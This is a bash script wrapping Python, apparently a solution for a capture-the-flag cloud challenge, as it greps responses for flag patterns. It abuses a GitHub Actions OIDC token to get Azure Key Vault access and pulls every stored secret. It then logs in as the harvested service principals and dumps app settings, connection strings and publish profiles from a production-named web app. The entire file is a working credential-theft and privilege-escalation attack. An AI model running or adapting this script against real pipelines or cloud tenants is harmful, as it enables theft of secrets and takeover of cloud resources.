#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, re, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    elif data==b"": body=b""; h.setdefault("Content-Length","0")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
M="https://management.azure.com"; RG2="rg-tbl-reporting-prod-eus"; SITE="app-tbl-reporting-prod"
FLAG=re.compile(r"(DF26\{[^}]{0,300}\}|flag\{[^}]{0,300}\}|FLAG\{[^}]{0,300}\})", re.I)
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,
  "scope":"https://vault.azure.net/.default","grant_type":"client_credentials",
  "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":IDT})
KVT=jg(b)["access_token"]
creds={}
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
for s in jg(b).get("value",[]):
    n=s["id"].rsplit("/",1)[-1]
    st2,b2=http(s["id"]+"?api-version=7.4",headers={"Authorization":"Bearer "+KVT})
    try: creds[n]=json.loads(jg(b2).get("value",""))
    except Exception: pass
def tok(c, sc):
    st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
      {"client_id":c["appId"],"client_secret":c["clientSecret"],"scope":sc,"grant_type":"client_credentials"})
    return jg(b).get("access_token")
BASE=f"{M}/subscriptions/{SUB}/resourceGroups/{RG2}/providers/Microsoft.Web/sites/{SITE}"
for who in ("reporting-service-principal","reporting-viewer-principal"):
    t=tok(creds[who], "https://management.azure.com/.default")
    H={"Authorization":"Bearer "+t}
    print(f"\n######## {who}")
    st,b=http(f"{M}/subscriptions/{SUB}/resourceGroups/{RG2}/providers/Microsoft.Authorization/permissions?api-version=2022-04-01", headers=H)
    for p in jg(b).get("value",[]): print("   permissions:", p.get("actions"), "not:", p.get("notActions"))
    st,b=http(BASE+"?api-version=2022-03-01", headers=H)
    d=jg(b)
    print("   site:", st, "| host:", d.get("properties",{}).get("defaultHostName"),
          "| identity:", json.dumps(d.get("identity",{}))[:300])
    for label, path, meth in (("appsettings","/config/appsettings/list","POST"),
                              ("connstrings","/config/connectionstrings/list","POST"),
                              ("publishxml","/publishxml","POST"),
                              ("web","/config/web","GET"),
                              ("functions","/functions","GET")):
        if meth=="POST": st,b=http(BASE+path+"?api-version=2022-03-01", data=b"", headers=H, method="POST")
        else: st,b=http(BASE+path+"?api-version=2022-03-01", headers=H)
        txt=b.decode("utf-8","replace")
        m=FLAG.search(txt)
        print(f"   {label:12} {st}" + (f"  >>> FLAG {m.group(1)}" if m else ""))
        if st==200 and label in ("appsettings","connstrings"):
            print("      ", json.dumps(jg(b).get("properties",{}))[:900])
        if st==200 and label=="publishxml":
            print("      ", txt[:600])
PYEOF
echo "=== done ==="